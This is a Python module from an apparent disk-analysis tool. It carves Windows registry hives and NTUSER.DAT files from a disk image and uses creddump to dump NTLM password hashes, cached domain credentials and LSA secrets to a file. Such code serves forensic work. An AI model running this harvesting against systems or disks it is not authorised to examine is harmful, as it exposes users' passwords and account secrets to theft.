"""

	Windows Reaper

	This script makes use of the disk handed to us by reaPyr and
	attempts to carve out the Windows NT password hashes, as well
	as any cached/saved passwords from IE

	Food for thought:

	* Delete the disk_rec contents when completed

	* copy the win_hrvst.txt file somewhere to the root
	directory when completed.

"""
import sys, os, hashlib

sys.path.append("./windows/creddump")

from framework.win32.domcachedump import dump_file_hashes as cachedump
from framework.win32.hashdump import dump_file_hashes as pwdump
from framework.win32.lsasecrets import get_file_secrets as lsadump

# http://aspn.activestate.com/ASPN/Cookbook/Python/Recipe/142812
FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

def dump(src, length=8):
	N=0; result=''
	while src:
		s,src = src[:length],src[length:]
		hexa = ' '.join(["%02X"%ord(x) for x in s])
		s = s.translate(FILTER)
		result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
		N+=length
	return result


def reap(d):
	# Registry hives containing NTLM password hashes.
	fout = open(os.path.join(d.rec_dir, "win_creds_dump.txt"),'a')

	harvest  = []
	rpr_name = "windows"


	"""
		Windows Credential Harvest
	"""

	# Target registry files
	sam_db  = "/Windows/system32/config/SAM"
	sys_db  = "/Windows/system32/config/system"
	sec_db  = "/Windows/system32/config/security"
	sof_db  = "/Windows/system32/config/software"

	d.carve(sam_db) # Carve the SAM DB
	if(os.path.exists(os.path.join(d.rec_dir, "SAM"))):
		# Append the harvested file information to the list
		dest_fname = os.path.join(d.rec_dir, "SAM")
		sha1       = hashlib.sha1(open(dest_fname, 'rb').read()).hexdigest()
		fsize      = os.path.getsize(dest_fname)
		desc       = "Windows SAM Database"
		harvest.append(rpr_name+",SAM,"+sha1+","+str(fsize)+","+desc)

	d.carve(sys_db) # Carve the system registry
	if(os.path.exists(os.path.join(d.rec_dir, "system"))):
		# Append the harvested file information to the list
		dest_fname = os.path.join(d.rec_dir, "system")
		sha1       = hashlib.sha1(open(dest_fname, 'rb').read()).hexdigest()
		fsize      = os.path.getsize(dest_fname)
		desc       = "Windows system registry hive"
		harvest.append(rpr_name+",system,"+sha1+","+str(fsize)+","+desc)

	d.carve(sec_db) # Carve the security registry
	if(os.path.exists(os.path.join(d.rec_dir, "security"))):
		# Append the harvested file information to the list
		dest_fname = os.path.join(d.rec_dir, "security")
		sha1       = hashlib.sha1(open(dest_fname, 'rb').read()).hexdigest()
		fsize      = os.path.getsize(dest_fname)
		desc       = "Windows security registry hive"
		harvest.append(rpr_name+",security,"+sha1+","+str(fsize)+","+desc)

	d.carve(sof_db) # Carve the software registry
	if(os.path.exists(os.path.join(d.rec_dir, "software"))):
		# Append the harvested file information to the list
		dest_fname = os.path.join(d.rec_dir, "software")
		sha1       = hashlib.sha1(open(dest_fname, 'rb').read()).hexdigest()
		fsize      = os.path.getsize(dest_fname)
		desc       = "Windows software registry hive"
		harvest.append(rpr_name+",software,"+sha1+","+str(fsize)+","+desc)

	"""
	 Now, pass off the registry files we just obtained to creddump-0.3
	 https://code.google.com/p/creddump/
	 Thanks Internet!
	"""

	# Dump the file hashes
	hashes = pwdump("./disk_rec/system","./disk_rec/SAM")
	if hashes != []:
		fout.write("#"*35+" SAM HASHES "+"#"*35+"\n")
		for h in hashes:
			fout.write(h+"\n")
		fout.write("\n\n")

	# Dump any cached credentials
	caches = cachedump("./disk_rec/system","./disk_rec/security")
	if caches and 'ERR' not in caches:
		fout.write("#"*35+" CACHED PWDS "+"#"*35+"\n")
		fout.write(caches)
		fout.write("\n\n")


	# LSA Secrets is just a little different, we port the code from lsadump.pu
	# provided by creddump, in order to redirect the output to our hrvst file.
	# Hex dump code from
	secrets = lsadump("./disk_rec/system","./disk_rec/security")
	if secrets != []:
		fout.write("#"*35+" LSA SECRETS "+"#"*35+"\n")
		for k in secrets:
			fout.write(k+"\n")
			fout.write(dump(secrets[k], length=16)+"\n")
		fout.write("\n\n")

	# Append the harvested file information to the list
	dest_fname = os.path.join(d.rec_dir, "win_creds_dump.txt")
	sha1       = hashlib.sha1(open(dest_fname, 'rb').read()).hexdigest()
	fsize      = os.path.getsize(dest_fname)
	desc       = "Credential Hash Dump of Windows Accounts"
	harvest.append(rpr_name+",win_creds_dump.txt,"+sha1+","+str(fsize)+","+desc)

	"""
		Carve NTUser.dat files for stored cached credentials - This is essentially IE/Outlook
	"""
	user_dir = "/Documents and Settings/"
	ntdat    = "/NTUSER.DAT"
	users_xp = d.dir_carve(user_dir)

	if users_xp	!= [] and "ERROR" not in users_xp:
		for u in users_xp:
			fname = d.carve(user_dir+u+ntdat)
			if os.path.exists(fname):
				f = u+"_"+fname.split('/')[-1]
				os.rename(fname,os.path.join(d.rec_dir,f))

				# Append the harvested file information to the list
				dest_fname = os.path.join(d.rec_dir,f)
				sha1       = hashlib.sha1(open(dest_fname, 'rb').read()).hexdigest()
				fsize      = os.path.getsize(dest_fname)
				harvest.append(rpr_name+","+f+","+sha1+","+str(fsize)+","+desc)

	return harvest

